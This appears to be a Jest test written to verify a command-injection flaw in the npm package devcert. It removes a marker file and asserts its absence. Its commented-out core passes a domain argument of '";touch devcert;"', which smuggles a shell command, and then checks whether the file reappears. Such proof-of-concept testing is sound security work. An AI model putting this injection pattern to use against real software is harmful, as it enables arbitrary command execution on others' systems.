test("Command Injection in devcert", () => {
  const devcert = require("devcert");
  const fs = require("fs");
  const path = "./devcert";
  const sleep = require("sleep");

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  // devcert.certificateFor('";touch devcert;"').then(() => {
  //   console.log("done");
  // });
  // sleep.sleep(5);
  // file_exist = fs.existsSync(path);
  // expect(file_exist).toBe(true);
  // fs.unlink(path, function (err) {});

  // setTimeout(() => {
  //   file_exist = fs.existsSync(path);
  //   expect(file_exist).toBe(true);
  //   fs.unlink(path, () => {done();});
  // }, 500);
});
